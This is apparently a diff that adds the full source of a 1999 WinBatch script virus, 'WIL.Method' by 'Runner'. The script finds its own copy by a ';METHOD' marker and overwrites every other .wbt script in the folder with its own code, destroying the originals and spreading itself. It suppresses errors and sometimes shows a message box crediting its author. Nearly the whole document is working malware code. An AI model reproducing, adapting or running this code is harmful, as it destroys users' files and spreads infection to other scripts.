@@ -1,0 +1,53 @@
+;METHOD
+;WIL.Method: First ever WinBatch virus
+;by Runner, CopyRight 1999
+IntControl(29, @TAB, 0, 0, 0)
+ErrorMode(@OFF)
+
+MyCode = ""
+AllWBT = FileItemize("*.wbt")
+       
+For i = 1 to ItemCount(AllWBT, @tab)
+OneWBT = ItemExtract(i, AllWBT, @tab)
+
+fs=FileSize(OneWBT)
+MarkBuffer = BinaryAlloc(fs+100)
+
+BinaryRead(MarkBuffer, OneWBT)
+If BinaryPeekStr( MarkBuffer, 0, 7) == ";METHOD" then
+
+MyCode = OneWBT 
+break
+End If
+
+Next i
+
+If MyCode != OneWBT Then EXIT
+
+For w = 1 To ItemCount(AllWBT, @tab)
+OneWBT = ItemExtract(w, AllWBT, @tab)
+
+If MyCode != OneWBT
+
+virus = FileOpen(MyCode, "READ")
+host = FileOpen(OneWBT, "WRITE")
+
+While @TRUE           
+        x = FileRead(virus)
+        If x == "*EOF*" Then Break
+        FileWrite(host, x)
+EndWhile
+
+FileClose(host)
+FileClose(virus)
+End If
+
+Next w
+
+num = Random(10) 
+If num == 1 Then Message("WIL.Method by Runner","WIL.Method: First ever WinBatch virus, coded by Runner.")
+EXIT 
+
+
+
+
